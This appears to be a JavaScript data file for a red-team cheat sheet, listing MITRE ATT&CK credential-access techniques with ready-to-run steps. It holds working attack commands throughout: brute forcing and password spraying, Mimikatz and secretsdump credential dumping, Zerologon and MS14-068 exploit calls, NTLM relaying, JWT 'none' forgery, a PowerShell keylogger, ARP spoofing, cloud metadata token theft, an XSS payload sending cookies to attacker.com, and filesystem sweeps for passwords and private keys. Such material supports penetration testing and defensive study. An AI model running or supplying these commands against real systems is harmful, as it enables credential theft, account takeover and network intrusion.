export const credAccessTechniques = [
  {
    id: "T1110",
    name: "Brute Force",
    summary: "Hydra • hashcat • Medusa • password spray",
    description: "Attempting to access accounts through trial and error of passwords, including dictionary attacks, brute force, and credential stuffing.",
    tags: ["T1110", "Hydra", "hashcat", "password spray", "credential stuffing"],
    steps: [
      { type: "comment", content: "# T1110.001 - Brute force SSH with Hydra" },
      { type: "cmd", content: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com -t 4 -o ssh_results.txt" },
      { type: "comment", content: "# T1110.003 - Password spraying against Active Directory" },
      { type: "cmd", content: "kerbrute passwordspray -d domain.com --dc dc.domain.com users.txt 'Winter2024!'\nnxc smb dc.domain.com -u users.txt -p 'Password1!' --continue-on-success" },
      { type: "comment", content: "# T1110.004 - Credential stuffing against web application" },
      { type: "cmd", content: "credmaster -m okta -u emails.txt -p breached_passwords.txt --threads 50" },
      { type: "comment", content: "# T1110.002 - Hash cracking with hashcat" },
      { type: "cmd", content: "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force" },
    ]
  },
  {
    id: "T1555",
    name: "Credentials from Password Stores",
    summary: "browser creds • KeePass • Windows Credential Manager",
    description: "Extracting credentials from password stores including browser password managers, credential managers, and password vaults.",
    tags: ["T1555", "browser passwords", "KeePass", "Credential Manager", "keychain"],
    steps: [
      { type: "comment", content: "# T1555.003 - Extract credentials from Chrome/Firefox" },
      { type: "cmd", content: "SharpChrome.exe logins\n# Or:\nlaZagne.exe browsers" },
      { type: "comment", content: "# T1555.004 - Windows Credential Manager extraction" },
      { type: "cmd", content: "cmdkey /list  # List stored credentials\nvaultcmd /listcreds:\"Windows Credentials\" /all" },
      { type: "comment", content: "# LaZagne for comprehensive credential extraction" },
      { type: "cmd", content: "laZagne.exe all -oN  # Extract all credentials from common stores\n# Covers: browsers, databases, Git, WiFi, Windows Credentials" },
      { type: "comment", content: "# T1555.001 - macOS Keychain extraction" },
      { type: "cmd", content: "security find-generic-password -wa 'Chrome'\nsecurity dump-keychain -d login.keychain" },
    ]
  },
  {
    id: "T1212",
    name: "Exploitation for Credential Access",
    summary: "MS14-068 • Zerologon • SAM bypass",
    description: "Exploiting software vulnerabilities in authentication systems to bypass or extract credentials.",
    tags: ["T1212", "MS14-068", "Zerologon", "CVE exploits"],
    steps: [
      { type: "comment", content: "# CVE-2020-1472 Zerologon - reset DC machine account password" },
      { type: "cmd", content: "python3 zerologon_tester.py DC01 10.0.0.1  # Test\npython3 cve-2020-1472-exploit.py DC01 10.0.0.1  # Exploit" },
      { type: "comment", content: "# MS14-068 Kerberos privilege escalation" },
      { type: "cmd", content: "python3 ms14-068.py -u user@domain.com -p password -s S-1-5-21-... -d dc.domain.com" },
    ]
  },
  {
    id: "T1187",
    name: "Forced Authentication",
    summary: "Responder • LLMNR/NBT-NS poisoning • relay",
    description: "Capturing credentials by forcing systems to authenticate to attacker-controlled services via LLMNR, NBT-NS, or other protocols.",
    tags: ["T1187", "Responder", "LLMNR", "NBT-NS", "NTLM capture"],
    steps: [
      { type: "comment", content: "# T1187 - Poison LLMNR/NBT-NS to capture NTLM hashes" },
      { type: "cmd", content: "Responder -I eth0 -wrdP  # Capture NTLMv2 hashes on the wire" },
      { type: "comment", content: "# Crack captured NTLMv2 hash with hashcat" },
      { type: "cmd", content: "hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt" },
      { type: "comment", content: "# Relay NTLMv2 hashes instead of cracking" },
      { type: "cmd", content: "ntlmrelayx.py -tf targets_without_smb_signing.txt -smb2support\n# Simultaneously run Responder with SMB/HTTP disabled" },
    ]
  },
  {
    id: "T1606",
    name: "Forge Web Credentials",
    summary: "Golden SAML • JWT forgery • cookie manipulation",
    description: "Forging web authentication credentials such as SAML tokens, JWTs, and cookies to gain unauthorized access.",
    tags: ["T1606", "Golden SAML", "JWT", "SAML forgery"],
    steps: [
      { type: "comment", content: "# T1606.002 - Golden SAML attack (requires ADFS private key)" },
      { type: "cmd", content: "python3 shimit.py -pk adfs_private_key.pem -c adfs_cert.pem -u admin@victim.com -i 'http://adfs.victim.com/adfs/services/trust' -n admin" },
      { type: "comment", content: "# T1606.001 - JWT forgery (algorithm confusion)" },
      { type: "code", content: "# HS256 to RS256 algorithm confusion attack\nimport jwt, json, base64\n\n# Get public key from server\n# Sign JWT with 'none' algorithm or HS256 using public key as secret\npayload = {'user': 'admin', 'role': 'admin'}\nforged = jwt.encode(payload, '', algorithm='none')\nprint(forged)" },
    ]
  },
  {
    id: "T1056",
    name: "Input Capture",
    summary: "keylogger • form grabbing • credential prompt",
    description: "Capturing user input including keystrokes, form data, and credential prompts via keyloggers or API hooking.",
    tags: ["T1056", "keylogger", "form grabbing", "input capture"],
    steps: [
      { type: "comment", content: "# T1056.001 - PowerShell keylogger" },
      { type: "code", content: "# PowerShell keylogger using GetAsyncKeyState\nAdd-Type -TypeDefinition @'\npublic class KLogger {\n    [System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n    public static extern int GetAsyncKeyState(int vKey);\n}\n'@\nwhile($true) {\n    for($i=8; $i -le 190; $i++) {\n        if([KLogger]::GetAsyncKeyState($i) -eq -32767) {\n            [console]::write([char]$i)\n        }\n    }\n    Start-Sleep -Milliseconds 50\n}" },
      { type: "comment", content: "# T1056.002 - GUI-based credential prompt phishing" },
      { type: "code", content: "$cred = Get-Credential -Message 'Windows Security Update requires your credentials'\n# Sends captured credentials to attacker" },
    ]
  },
  {
    id: "T1557",
    name: "Adversary-in-the-Middle",
    summary: "ARP spoofing • DHCP spoof • SSL strip",
    description: "Positioning between victim and legitimate service to intercept and potentially modify network traffic to capture credentials.",
    tags: ["T1557", "ARP spoofing", "MITM", "DHCP spoof", "SSL strip"],
    steps: [
      { type: "comment", content: "# T1557.001 - ARP cache poisoning for MITM" },
      { type: "cmd", content: "arpspoof -i eth0 -t victim_ip gateway_ip &\narpspoof -i eth0 -t gateway_ip victim_ip &\nettercap -T -q -i eth0 -M arp:remote /victim_ip// /gateway_ip//" },
      { type: "comment", content: "# T1557.003 - DHCP spoofing to control DNS for MITM" },
      { type: "cmd", content: "python3 dhcp_spoof.py --interface eth0 --gateway 10.0.0.1\n# Route victim traffic through attacker machine" },
      { type: "comment", content: "# SSL stripping with mitmproxy" },
      { type: "cmd", content: "mitmproxy --mode transparent --ssl-insecure -w captured_traffic.pcap" },
    ]
  },
  {
    id: "T1003",
    name: "OS Credential Dumping",
    summary: "Mimikatz • secretsdump • LSASS dump",
    description: "Dumping credentials from OS storage mechanisms including LSASS, SAM, NTDS.dit, and cached credentials.",
    tags: ["T1003", "Mimikatz", "LSASS dump", "secretsdump", "credential dumping"],
    steps: [
      { type: "comment", content: "# T1003.001 - Dump LSASS with Mimikatz" },
      { type: "cmd", content: "mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::wdigest  # Plaintext passwords if WDigest enabled" },
      { type: "comment", content: "# T1003.001 - Remote LSASS dump via secretsdump" },
      { type: "cmd", content: "secretsdump.py domain/user:pass@target.com\nsecretsdump.py -hashes :NTHASH domain/user@target.com" },
      { type: "comment", content: "# T1003.002 - SAM database dump" },
      { type: "cmd", content: "reg save HKLM\\SAM SAM && reg save HKLM\\SYSTEM SYSTEM\nsecretsdump.py -sam SAM -system SYSTEM LOCAL" },
      { type: "comment", content: "# T1003.003 - NTDS.dit extraction (Domain Controller)" },
      { type: "cmd", content: "secretsdump.py domain/admin:pass@dc.domain.com -just-dc\n# Or using ntdsutil:\nntdsutil 'ac i ntds' 'ifm' 'create full C:\\temp' q q" },
      { type: "comment", content: "# T1003.006 - DCSync attack (requires replication rights)" },
      { type: "cmd", content: "secretsdump.py -just-dc-user krbtgt domain/admin:pass@dc.domain.com\nmimikatz # lsadump::dcsync /user:krbtgt" },
    ]
  },
  {
    id: "T1528",
    name: "Steal Application Access Token",
    summary: "OAuth token theft • AWS creds • Azure tokens",
    description: "Stealing application access tokens such as OAuth tokens, cloud provider credentials, and API keys.",
    tags: ["T1528", "OAuth", "AWS credentials", "Azure token", "API keys"],
    steps: [
      { type: "comment", content: "# Steal AWS credentials from EC2 metadata endpoint" },
      { type: "cmd", content: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME" },
      { type: "comment", content: "# Steal Azure Managed Identity token from IMDS" },
      { type: "cmd", content: "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H 'Metadata:true'" },
      { type: "comment", content: "# Extract OAuth tokens from browser/app storage" },
      { type: "cmd", content: "# Chrome tokens: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\n# Search for .json credential files:\ndir C:\\Users\\*\\.aws\\credentials /s\ndir C:\\Users\\*\\.azure\\accessTokens.json /s" },
    ]
  },
  {
    id: "T1539",
    name: "Steal Web Session Cookie",
    summary: "cookie theft • session hijacking • XSS",
    description: "Stealing web session cookies to authenticate as a victim user without needing their credentials.",
    tags: ["T1539", "cookie theft", "session hijacking", "XSS"],
    steps: [
      { type: "comment", content: "# T1539 - XSS to steal session cookies" },
      { type: "code", content: "// Malicious XSS payload to exfiltrate cookies\n<script>\nnew Image().src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);\n</script>" },
      { type: "comment", content: "# Extract cookies from browser profile" },
      { type: "cmd", content: "# Copy SQLite cookie database:\ncp '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies' /tmp/cookies.db\nsqlite3 /tmp/cookies.db 'SELECT host_key,name,encrypted_value FROM cookies;'" },
      { type: "comment", content: "# Evilginx2 for cookie capture via reverse proxy phishing" },
      { type: "cmd", content: "evilginx2  # Captures session cookies bypassing MFA" },
    ]
  },
  {
    id: "T1552",
    name: "Unsecured Credentials",
    summary: "plaintext files • environment variables • bash history",
    description: "Finding credentials stored insecurely in files, environment variables, command history, and configuration files.",
    tags: ["T1552", "plaintext creds", "environment variables", "bash history", "config files"],
    steps: [
      { type: "comment", content: "# T1552.001 - Search files for credentials" },
      { type: "cmd", content: "grep -rn 'password\\|passwd\\|secret\\|api_key\\|token' /etc/ /home/ /var/ 2>/dev/null\nfindstr /si password *.xml *.ini *.txt *.config  # Windows" },
      { type: "comment", content: "# T1552.004 - Extract private keys from filesystem" },
      { type: "cmd", content: "find / -name '*.pem' -o -name '*.key' -o -name 'id_rsa' -o -name '*.pfx' 2>/dev/null" },
      { type: "comment", content: "# T1552.007 - Container secrets and environment variables" },
      { type: "cmd", content: "docker inspect container_id | grep -i 'env\\|secret\\|password'\nprintenv | grep -i 'pass\\|secret\\|key\\|token'" },
      { type: "comment", content: "# T1552.002 - Check group policy preferences for stored creds" },
      { type: "cmd", content: "Get-GPPPassword  # PowerSploit\n# Or manually: \\\\domain\\sysvol\\*\\Policies\\**\\*.xml" },
    ]
  },
];